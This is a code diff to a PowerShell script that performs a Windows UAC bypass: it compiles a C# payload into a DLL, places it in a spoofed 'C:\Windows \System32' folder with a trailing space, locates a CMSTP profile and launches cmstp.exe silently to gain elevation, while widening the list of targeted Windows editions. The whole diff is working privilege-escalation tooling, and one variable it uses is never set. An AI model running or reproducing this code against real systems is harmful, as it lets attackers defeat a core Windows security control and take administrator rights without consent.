@@ -22,6 +22,41 @@ function Get-PSLocation {
     exit
 }
 
+function Check-Assembly {
+    param (
+        [string]$assemblyName
+    )
+    try {
+        [void][Reflection.Assembly]::LoadWithPartialName($assemblyName) | Out-Null
+        Write-Host "Assembly $assemblyName is accessible."
+    } catch {
+        Write-Host "Assembly $assemblyName is not accessible." -ForegroundColor Red
+        Write-Host "Attempting to load the assembly..."
+        # Optionally, you could handle a fallback or log the error here
+    }
+}
+
+# Function to find the CMSTPProfile.inf file
+function Get-CMSTPProfilePath {
+    $searchLocations = @(
+        "C:\windows \system32", # Add your custom path here
+        "$env:USERPROFILE\Documents",
+        "$env:ProgramData",
+        "$env:Temp"
+    )
+
+    foreach ($location in $searchLocations) {
+        $profilePath = Join-Path -Path $location -ChildPath "CMSTPProfile.inf"
+        if (Test-Path $profilePath) {
+            Write-Host "Found CMSTPProfile at: $profilePath"
+            return $profilePath
+        }
+    }
+
+    Write-Host "CMSTPProfile.inf not found in the specified locations." -ForegroundColor Red
+    return $null
+}
+
 $PSLocation = Get-PSLocation
 
 Write-Host "---------------------------------------"
@@ -34,10 +69,28 @@ $OSVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\Curren
 $supportedVersions = @(
     "Windows 10 Home",
     "Windows 10 Pro",
+    "Windows 10 Education",
     "Windows 10 Enterprise",
+    "Windows 10 Enterprise 2015",
+    "Windows 10 Mobile and Mobile Enterprise",
+    "Windows 10 IoT Core",
+    "Windows 10 IoT Enterprise LTSC 2021",
+    "Windows 10 IoT Mobile Enterprise",
     "Windows Server 2019 Standard",
+    "Windows Server 2019 Datacenter",
+    "Windows Server 2019 Essentials",
+    "Windows Server 2019 Azure Core",
     "Windows Server 2022 Standard",
-    "Windows 11 Pro"
+    "Windows Server 2022 Datacenter",
+    "Windows Server 2022 Azure Core",
+    "Windows 11 Home",
+    "Windows 11 Pro",
+    "Windows 11 Education",
+    "Windows 11 Enterprise",
+    "Windows 11 IoT Enterprise",
+    "Windows 11 IoT Mobile Enterprise",
+    "Windows 11 Team",
+    "Windows 11 Enterprise Multi-session"
 )
 
 if ($supportedVersions -notcontains $OSVersion) {
@@ -48,7 +101,7 @@ if ($supportedVersions -notcontains $OSVersion) {
 }
 
 # Create a mock folder
-$mockFolderPath = "C:\Windows\System32\MockFolder"
+$mockFolderPath = "C:\Windows\ System32\"
 if (-not (Test-Path $mockFolderPath)) {
     New-Item -Path $mockFolderPath -ItemType Directory | Out-Null
     Write-Host "Mock folder created at $mockFolderPath."
@@ -74,17 +127,20 @@ if (-not (Test-Path $cmstpPath)) {
     Write-Host "cmstp.exe is already installed at $cmstpPath."
 }
 
+# Check for System.Windows.Forms assembly accessibility
+Check-Assembly -assemblyName "System.Windows.Forms"
+
 # Compiling DLLs
 Write-Host "Compiling DLL files..."
 Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "$mockFolderPath\sl0p.dll"
 Write-Host "DLL files created."
 
 # Copy DLL files to System32
-Copy-Item "$mockFolderPath\sl0p.dll" -Destination "C:\Windows\System32\sl0p.dll" -Force
+Copy-Item "$mockFolderPath\sl0p.dll" -Destination "C:\Windows \System32\sl0p.dll" -Force
 Write-Host "DLL copied to System32."
 
 # Verify DLL placement
-if (Test-Path "C:\Windows\System32\sl0p.dll") {
+if (Test-Path "C:\Windows \System32\sl0p.dll") {
     Write-Host "DLL verification successful."
 } else {
     Write-Host "DLL not found in System32." -ForegroundColor Red
@@ -96,15 +152,16 @@ if (Test-Path "C:\Windows\System32\sl0p.dll") {
 # Check for admin privileges
 $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
 if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}"' -f $myinvocation.MyCommand.Definition)
+    # Start a new elevated PowerShell session in System32
+    Start-Process -FilePath "$PSLocation" -ArgumentList '-NoExit', '-File', $myinvocation.MyCommand.Definition -Verb RunAs -WorkingDirectory 'C:\Windows\System32'
     exit
 }
 
-# Execute CMSTP Bypass
-if ($OSVersion -match "Windows 10|Windows 11|Windows Server 2019|Windows Server 2022") {
-    Write-Host "Executing CMSTP bypass..."
-    Start-Process "cmstp.exe" -ArgumentList "/s", "C:\Path\To\Your\CMSTPProfile.inf"
-}
+    if ($null -ne $cmstpProfilePath) {
+        Start-Process "cmstp.exe" -ArgumentList "/s", $cmstpProfilePath
+    } else {
+        Write-Host "Skipping CMSTP bypass due to missing profile." -ForegroundColor Red
+    }
 
 # Display Group Policy Results
 Write-Host "Getting user scope..."
@@ -117,4 +174,3 @@ Write-Host "Getting LUA Settings..."
 Get-ItemProperty HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system
 
 Write-Host "________________________"
-
